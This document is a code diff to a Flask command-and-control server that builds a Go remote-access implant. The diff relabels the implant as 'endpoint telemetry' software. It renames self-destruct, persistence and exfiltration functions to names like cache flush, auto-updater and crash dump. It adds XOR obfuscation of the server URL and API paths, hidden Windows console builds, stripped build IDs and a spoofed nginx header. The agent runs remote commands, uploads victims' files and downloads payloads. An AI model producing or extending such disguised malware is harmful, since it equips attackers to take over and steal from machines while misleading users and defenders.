@@ -52,7 +52,7 @@ def dashboard():
 # ─────────────────────────────────────────────
 
 @app.route("/api/checkin", methods=["POST"])
-def checkin():
+def SyncDeviceState():
     """
     Agent check-in endpoint.
     Expects: { "kid": "<8-char key fingerprint>", "data": "<base64 AES-256-GCM encrypted JSON>" }
@@ -141,7 +141,7 @@ def _get_key_for_kid(kid: str) -> str | None:
 
 
 # ─────────────────────────────────────────────
-#  Task Management API
+#  DiagnosticTask Management API
 # ─────────────────────────────────────────────
 
 @app.route("/api/task", methods=["POST"])
@@ -235,7 +235,7 @@ def submit_result():
         "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
     ).fetchone()
 
-    if task and task["command"] == "__selfdestruct__":
+    if task and task["command"] == "__flush_cache__":
         agent_id = task["agent_id"]
         conn.execute("""
             DELETE FROM results WHERE task_id IN (
@@ -317,14 +317,14 @@ def delete_agent(agent_id):
 
     # Check if a self-destruct task is already pending
     existing = conn.execute(
-        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__selfdestruct__' AND status = 'pending'",
+        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__flush_cache__' AND status = 'pending'",
         (agent_id,),
     ).fetchone()
 
     if not existing:
         # Queue the self-destruct command
         conn.execute(
-            "INSERT INTO tasks (agent_id, command) VALUES (?, '__selfdestruct__')",
+            "INSERT INTO tasks (agent_id, command) VALUES (?, '__flush_cache__')",
             (agent_id,),
         )
         conn.commit()
@@ -392,94 +392,136 @@ def _sanitize_interval(interval_str):
     return interval_str.strip()
 
 
+def _xor_encrypt(key: bytes, plaintext: str) -> str:
+    """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
+    pt = plaintext.encode()
+    ct = bytes(b ^ key[i % len(key)] for i, b in enumerate(pt))
+    return ct.hex()
+
+
 def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
                         profile_id=1, locale="en-US,en;q=0.9",
                         key_hex="", key_id=""):
     """Generate a config.go file with the given settings."""
 
+    # Generate a random 16-byte XOR key for string obfuscation
+    xor_key = os.urandom(16)
+    xor_key_hex = xor_key.hex()
+
+    # XOR-encrypt sensitive strings at build time
+    enc_server_url   = _xor_encrypt(xor_key, server_url)
+    enc_checkin_path = _xor_encrypt(xor_key, "/api/checkin")
+    enc_result_path  = _xor_encrypt(xor_key, "/api/result")
+    enc_upload_path  = _xor_encrypt(xor_key, "/api/upload")
+    enc_files_path   = _xor_encrypt(xor_key, "/api/files/")
+    enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
+    enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")
+
     return f'''package main
 
 import (
-\t"crypto/rand"
-\t"encoding/hex"
-\t"fmt"
-\t"net/http"
-\t"os"
-\t"runtime"
-\t"time"
+	"crypto/rand"
+	"encoding/hex"
+	"fmt"
+	"net/http"
+	"os"
+	"runtime"
+	"time"
 
-\t"c2-agent/funcs"
+	"endpoint-telemetry/funcs"
 )
-
-// ─── Configuration ───
 
 var (
-\tServerURL     = "{server_url}"
-\tJitterMin     = {jitter_min} * time.Second
-\tJitterMax     = {jitter_max} * time.Second
-\tProfileID     = {profile_id}
-\tLocale        = "{locale}"
-\tAgentID       string
-\tEnablePersist = {str(persistence).lower()}
+	// XOR key for runtime string decoding (generated per build)
+	obfKey = parseDiagnosticKey("{xor_key_hex}")
 
-\t// ─── Per-build AES-256-GCM Key ───
-\tKeyID         = "{key_id}"
-\tEncryptionKey = mustDecodeHex("{key_hex}")
+	// Sensitive strings decoded at init time
+	TelemetryEndpoint string
+	PathCheckin       string
+	PathResult        string
+	PathUpload        string
+	PathFiles         string
+	FlushCommand      string
+	ServiceTag        string
+
+	SyncDelayMin  = {jitter_min} * time.Second
+	SyncDelayMax  = {jitter_max} * time.Second
+	ProfileID     = {profile_id}
+	Locale        = "{locale}"
+	EndpointID    string
+	EnablePersist = {str(persistence).lower()}
+
+	// Per-build AES-256-GCM key
+	KeyID         = "{key_id}"
+	EncryptionKey = parseDiagnosticKey("{key_hex}")
 )
 
-// mustDecodeHex converts a compile-time hex literal to []byte.
-// Panics at startup if the key is malformed so we fail fast.
-func mustDecodeHex(s string) []byte {{
-\tb, err := hex.DecodeString(s)
-\tif err != nil {{
-\t\tpanic("c2-agent: invalid encryption key: " + err.Error())
-\t}}
-\treturn b
+// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
+// If this panics at startup the binary was built with a malformed key.
+func parseDiagnosticKey(s string) []byte {{
+	b, err := hex.DecodeString(s)
+	if err != nil {{
+		panic("config: invalid key hex: " + err.Error())
+	}}
+	return b
 }}
 
-func generateUUID() string {{
-\tb := make([]byte, 16)
-\trand.Read(b)
-\tb[6] = (b[6] & 0x0f) | 0x40
-\tb[8] = (b[8] & 0x3f) | 0x80
-\treturn fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
+func assignEndpointID() string {{
+	b := make([]byte, 16)
+	rand.Read(b)
+	b[6] = (b[6] & 0x0f) | 0x40 // version 4
+	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
+	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
 }}
 
-func InitConfig() {{
-\tAgentID = generateUUID()
+func InitializeTelemetry() {{
+	// Decode obfuscated strings into memory
+	TelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
+	PathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
+	PathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
+	PathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
+	PathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
+	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
+	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
+	funcs.ServiceLabel = ServiceTag
 
-\tprofile, ok := funcs.Profiles[ProfileID]
-\tif !ok {{
-\t\tprofile = funcs.Profiles[1]
-\t}}
+	EndpointID = assignEndpointID()
 
-\tprofile.Headers["Accept-Language"] = Locale
+	profile, ok := funcs.Profiles[ProfileID]
+	if !ok {{
+		profile = funcs.Profiles[1] // fallback to Chrome/Windows
+	}}
 
-\thttp.DefaultClient = &http.Client{{
-\t\tTransport: &funcs.UATransport{{
-\t\t\tBase:    http.DefaultTransport,
-\t\t\tProfile: profile,
-\t\t}},
-\t}}
+	// Set Accept-Language from the locale baked in at build time
+	profile.Headers["Accept-Language"] = Locale
 
-\tfmt.Println("═══════════════════════════════════════")
-\tfmt.Println("       C2 Agent - Initialized          ")
-\tfmt.Println("═══════════════════════════════════════")
-\tfmt.Printf("  Agent ID  : %s\\n", AgentID)
-\tfmt.Printf("  Server    : %s\\n", ServerURL)
-\tfmt.Printf("  Jitter    : %s - %s\\n", JitterMin, JitterMax)
-\tfmt.Printf("  Profile   : %s\\n", profile.Name)
-\tfmt.Printf("  Locale    : %s\\n", Locale)
-\tfmt.Printf("  Key ID    : %s\\n", KeyID)
-\tfmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
+	// Replace the default HTTP client so every request the agent makes
+	// goes through the browser profile transport automatically
+	http.DefaultClient = &http.Client{{
+		Transport: &funcs.UATransport{{
+			Base:    http.DefaultTransport,
+			Profile: profile,
+		}},
+	}}
 
-\thostname, err := os.Hostname()
-\tif err == nil {{
-\t\tfmt.Printf("  Hostname  : %s\\n", hostname)
-\t}}
+	fmt.Println("=======================================")
+	fmt.Println("   Endpoint Telemetry  Initialized     ")
+	fmt.Println("=======================================")
+	fmt.Printf("  Endpoint  : %s\\n", EndpointID)
+	fmt.Printf("  Gateway   : %s\\n", TelemetryEndpoint)
+	fmt.Printf("  Interval  : %s to %s\\n", SyncDelayMin, SyncDelayMax)
+	fmt.Printf("  Profile   : %s\\n", profile.Name)
+	fmt.Printf("  Locale    : %s\\n", Locale)
+	fmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
 
-\tfmt.Println("═══════════════════════════════════════")
+	hostname, err := os.Hostname()
+	if err == nil {{
+		fmt.Printf("  Hostname  : %s\\n", hostname)
+	}}
+
+	fmt.Println("=======================================")
 }}
+
 '''
 
 
@@ -488,12 +530,12 @@ def _generate_main_go(persistence):
     persist_block = ""
     if persistence:
         persist_block = """
-\t// Install persistence mechanism
+\t// Register auto-update service
 \tif EnablePersist {{
-\t\tif err := funcs.Persist(); err != nil {{
-\t\t\tfmt.Printf("[!] Persistence failed: %v\\n", err)
+\t\tif err := funcs.InstallAutoUpdater(); err != nil {{
+\t\t\tfmt.Printf("[!] Auto-update registration failed: %v\\n", err)
 \t\t}} else {{
-\t\t\tfmt.Println("[+] Persistence installed successfully")
+\t\t\tfmt.Println("[+] Auto-update registered successfully")
 \t\t}}
 \t}}
 """
@@ -501,186 +543,194 @@ def _generate_main_go(persistence):
     return f'''package main
 
 import (
-\t"bytes"
-\t"encoding/json"
-\t"fmt"
-\t"io"
-\t"net/http"
-\t"os"
-\t"runtime"
-\t"strings"
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"runtime"
+	"strings"
 
-\t"c2-agent/funcs"
+	"endpoint-telemetry/funcs"
 )
 
-type CheckInPayload struct {{
-\tAgentID  string `json:"agent_id"`
-\tHostname string `json:"hostname"`
-\tOS       string `json:"os"`
+type DeviceTelemetryPayload struct {{
+	EndpointID  string `json:"agent_id"`
+	Hostname string `json:"hostname"`
+	OS       string `json:"os"`
 }}
 
-type CheckInResponse struct {{
-\tStatus string `json:"status"`
-\tTasks  []Task `json:"tasks"`
+type SyncResponse struct {{
+	Status string `json:"status"`
+	Jobs  []DiagnosticJob `json:"jobs"`
 }}
 
-type Task struct {{
-\tID      int    `json:"id"`
-\tCommand string `json:"command"`
+type DiagnosticJob struct {{
+	ID      int    `json:"id"`
+	Command string `json:"command"`
 }}
 
-type ResultPayload struct {{
-\tTaskID int    `json:"task_id"`
-\tOutput string `json:"output"`
+type DiagnosticOutput struct {{
+	JobID int    `json:"task_id"`
+	Output string `json:"output"`
 }}
 
 func main() {{
-\tInitConfig()
+	InitializeTelemetry()
 {persist_block}
-\thostname, _ := os.Hostname()
-\tagentOS := runtime.GOOS
+	hostname, _ := os.Hostname()
+	agentOS := runtime.GOOS
 
-\tfmt.Printf("\\n[*] Starting check-in loop (jitter: %s – %s)…\\n\\n", JitterMin, JitterMax)
+	fmt.Printf("\\n[*] Starting check-in loop (jitter: %s - %s)…\\n\\n", SyncDelayMin, SyncDelayMax)
 
-\tfor {{
-\t\ttasks, err := checkIn(hostname, agentOS)
-\t\tif err != nil {{
-\t\t\tfmt.Printf("[!] Check-in failed: %v\\n", err)
-\t\t\tfuncs.SleepWithJitter(JitterMin, JitterMax)
-\t\t\tcontinue
-\t\t}}
+	for {{
+		jobs, err := SyncDeviceState(hostname, agentOS)
+		if err != nil {{
+			fmt.Printf("[!] Check-in failed: %v\\n", err)
+			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
+			continue
+		}}
 
-\t\tfmt.Printf("[+] Checked in - %d pending task(s)\\n", len(tasks))
+		fmt.Printf("[+] Checked in - %d pending job(s)\\n", len(jobs))
 
-\t\tfor _, task := range tasks {{
-\t\t\tfmt.Printf("[>] Executing task #%d: %s\\n", task.ID, task.Command)
+		for _, job := range jobs {{
+			fmt.Printf("[>] Executing job #%d: %s\\n", job.ID, job.Command)
 
-\t\t\tif task.Command == "__selfdestruct__" {{
-\t\t\t\tfmt.Println("[!] Self-destruct command received from server!")
-\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
-\t\t\t\tfuncs.SelfDestruct()
-\t\t\t}}
+			if job.Command == FlushCommand {{
+				fmt.Println("[!] Cache flush command received from server")
+				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
+				funcs.WipeLocalCacheAndExit()
+			}}
 
-\t\t\tif funcs.IsCdCommand(task.Command) {{
-\t\t\t\toutput, cdErr := funcs.ExecuteCommand(task.Command)
-\t\t\t\tif cdErr != nil {{
-\t\t\t\t\toutput = fmt.Sprintf("Error: %v", cdErr)
-\t\t\t\t}}
-\t\t\t\t_ = sendResult(task.ID, output)
-\t\t\t\tcontinue
-\t\t\t}}
+			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
+			if funcs.IsPathUpdate(job.Command) {{
+				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
+				if cdErr != nil {{
+					output = fmt.Sprintf("Error: %v", cdErr)
+				}}
+				fmt.Printf("[<] Job #%d result: %s\\n", job.ID, output)
+				_ = SubmitDiagnosticReport(job.ID, output)
+				continue
+			}}
 
-\t\t\tif strings.HasPrefix(task.Command, "get ") {{
-\t\t\t\tgo func(t Task) {{
-\t\t\t\t\tfilePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-\t\t\t\t\toutput, err := funcs.UploadFile(ServerURL, AgentID, filePath)
-\t\t\t\t\tif err != nil {{
-\t\t\t\t\t\toutput = fmt.Sprintf("Exfil error: %v", err)
-\t\t\t\t\t}}
-\t\t\t\t\t_ = sendResult(t.ID, output)
-\t\t\t\t}}(task)
-\t\t\t\tcontinue
-\t\t\t}}
+			if strings.HasPrefix(job.Command, "get ") {{
+				go func(t DiagnosticJob) {{
+					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
+					if err != nil {{
+						output = fmt.Sprintf("Upload error: %v", err)
+					}}
+					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
+					_ = SubmitDiagnosticReport(t.ID, output)
+				}}(job)
+				continue
+			}}
 
-\t\t\tif strings.HasPrefix(task.Command, "download ") {{
-\t\t\t\tgo func(t Task) {{
-\t\t\t\t\targs := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
-\t\t\t\t\tparts := strings.SplitN(args, " ", 2)
-\t\t\t\t\tif len(parts) != 2 {{
-\t\t\t\t\t\t_ = sendResult(t.ID, "Usage: download <file_id> <save_path>")
-\t\t\t\t\t\treturn
-\t\t\t\t\t}}
-\t\t\t\t\toutput, err := funcs.DownloadFile(ServerURL, parts[0], strings.TrimSpace(parts[1]))
-\t\t\t\t\tif err != nil {{
-\t\t\t\t\t\toutput = fmt.Sprintf("Download error: %v", err)
-\t\t\t\t\t}}
-\t\t\t\t\t_ = sendResult(t.ID, output)
-\t\t\t\t}}(task)
-\t\t\t\tcontinue
-\t\t\t}}
+			if strings.HasPrefix(job.Command, "download ") {{
+				go func(t DiagnosticJob) {{
+					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
+					parts := strings.SplitN(args, " ", 2)
+					if len(parts) != 2 {{
+						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
+						return
+					}}
+					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
+					if err != nil {{
+						output = fmt.Sprintf("Download error: %v", err)
+					}}
+					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
+					_ = SubmitDiagnosticReport(t.ID, output)
+				}}(job)
+				continue
+			}}
 
-\t\t\tgo func(t Task) {{
-\t\t\t\toutput, execErr := funcs.ExecuteCommand(t.Command)
-\t\t\t\tif execErr != nil && output == "" {{
-\t\t\t\t\toutput = fmt.Sprintf("Error: %v", execErr)
-\t\t\t\t}}
-\t\t\t\tfmt.Printf("[<] Task #%d result (%d bytes)\\n", t.ID, len(output))
-\t\t\t\t_ = sendResult(t.ID, output)
-\t\t\t}}(task)
-\t\t}}
+			go func(t DiagnosticJob) {{
+				output, execErr := funcs.ExecuteDiagnosticTask(t.Command)
+				if execErr != nil && output == "" {{
+					output = fmt.Sprintf("Error: %v", execErr)
+				}}
+				fmt.Printf("[<] Job #%d result (%d bytes)\\n", t.ID, len(output))
+				err := SubmitDiagnosticReport(t.ID, output)
+				if err != nil {{
+					fmt.Printf("[!] Failed to send result for job #%d: %v\\n", t.ID, err)
+				}}
+			}}(job)
+		}}
 
-\t\tfuncs.SleepWithJitter(JitterMin, JitterMax)
-\t}}
+		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
+	}}
 }}
 
-func checkIn(hostname, agentOS string) ([]Task, error) {{
-\tpayload := CheckInPayload{{
-\t\tAgentID:  AgentID,
-\t\tHostname: hostname,
-\t\tOS:       agentOS,
-\t}}
+func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
+	payload := DeviceTelemetryPayload{{
+		EndpointID:  EndpointID,
+		Hostname: hostname,
+		OS:       agentOS,
+	}}
 
-\trespBody, err := encryptedPost(ServerURL+"/api/checkin", payload)
-\tif err != nil {{
-\t\treturn nil, err
-\t}}
+	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
+	if err != nil {{
+		return nil, err
+	}}
 
-\t// Server responds with the same {{"kid":...,"data":...}} envelope.
-\tvar envelope struct {{
-\t\tData string `json:"data"`
-\t}}
-\tif err := json.Unmarshal(respBody, &envelope); err != nil {{
-\t\treturn nil, fmt.Errorf("envelope unmarshal: %w", err)
-\t}}
+	// Unwrap the encrypted response envelope
+	var envelope struct {{
+		Data string `json:"data"`
+	}}
+	if err := json.Unmarshal(respBody, &envelope); err != nil {{
+		return nil, fmt.Errorf("envelope unmarshal: %w", err)
+	}}
 
-\tplain, err := funcs.Decrypt(EncryptionKey, envelope.Data)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("decrypt checkin response: %w", err)
-\t}}
+	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
+	if err != nil {{
+		return nil, fmt.Errorf("decrypt checkin response: %w", err)
+	}}
 
-\tvar result CheckInResponse
-\tif err := json.Unmarshal(plain, &result); err != nil {{
-\t\treturn nil, fmt.Errorf("unmarshal response: %w", err)
-\t}}
-\treturn result.Tasks, nil
+	var result SyncResponse
+	if err := json.Unmarshal(plain, &result); err != nil {{
+		return nil, fmt.Errorf("unmarshal response: %w", err)
+	}}
+	return result.Jobs, nil
 }}
 
-func sendResult(taskID int, output string) error {{
-\tpayload := ResultPayload{{
-\t\tTaskID: taskID,
-\t\tOutput: output,
-\t}}
-\t_, err := encryptedPost(ServerURL+"/api/result", payload)
-\treturn err
+func SubmitDiagnosticReport(jobID int, output string) error {{
+	payload := DiagnosticOutput{{
+		JobID: jobID,
+		Output: output,
+	}}
+	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
+	return err
 }}
 
-// encryptedPost marshals payload to JSON, encrypts it with AES-256-GCM,
-// wraps it in {{"kid":...,"data":...}} envelope, and POSTs to url.
-// Returns the raw response body for the caller to decrypt if needed.
-func encryptedPost(url string, payload any) ([]byte, error) {{
-\tinner, err := json.Marshal(payload)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("marshal: %w", err)
-\t}}
+// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
+// wraps the ciphertext in a {{kid, data}} envelope, and POSTs it.
+// Returns the raw response body so the caller can decrypt if needed.
+func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
+	inner, err := json.Marshal(payload)
+	if err != nil {{
+		return nil, fmt.Errorf("marshal: %w", err)
+	}}
 
-\tenc, err := funcs.Encrypt(EncryptionKey, inner)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("encrypt: %w", err)
-\t}}
+	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
+	if err != nil {{
+		return nil, fmt.Errorf("encrypt: %w", err)
+	}}
 
-\tenvelope := map[string]string{{"kid": KeyID, "data": enc}}
-\tbody, err := json.Marshal(envelope)
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("envelope marshal: %w", err)
-\t}}
+	envelope := map[string]string{{"kid": KeyID, "data": enc}}
+	body, err := json.Marshal(envelope)
+	if err != nil {{
+		return nil, fmt.Errorf("envelope marshal: %w", err)
+	}}
 
-\tresp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
-\tif err != nil {{
-\t\treturn nil, fmt.Errorf("post: %w", err)
-\t}}
-\tdefer resp.Body.Close()
-\treturn io.ReadAll(resp.Body)
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
+	if err != nil {{
+		return nil, fmt.Errorf("post: %w", err)
+	}}
+	defer resp.Body.Close()
+	return io.ReadAll(resp.Body)
 }}
+
 '''
 
 
@@ -787,16 +837,18 @@ def build_agent():
         env["GOOS"] = "darwin" if target_os == "mac" else target_os
         env["GOARCH"] = arch
         env["CGO_ENABLED"] = "0"
-        
-        # Base ldflags (strip debug symbols)
+
+        # Base ldflags (strip debug symbols and DWARF info)
         ldflags = "-s -w"
-        
+
         # If building for Windows, hide the console window entirely
         if target_os == "windows":
             ldflags += " -H=windowsgui"
 
+        ldflags += " -buildid="
+
         result = subprocess.run(
-            ["go", "build", "-ldflags", ldflags, "-o", output_path, "."],
+            ["go", "build", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
             cwd=tmp_agent,
             env=env,
             capture_output=True,
@@ -1115,7 +1167,7 @@ if __name__ == "__main__":
     # before that hook runs. Without this patch both headers appear in the
     # response, which is worse than one because it reveals the masking attempt.
     from werkzeug.serving import WSGIRequestHandler
-    WSGIRequestHandler.server_version = "nginx/1.24.0"
-    WSGIRequestHandler.sys_version = ""
+    setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
+    setattr(WSGIRequestHandler, "sys_version", "")
 
     app.run(host="0.0.0.0", port=5000, debug=False)
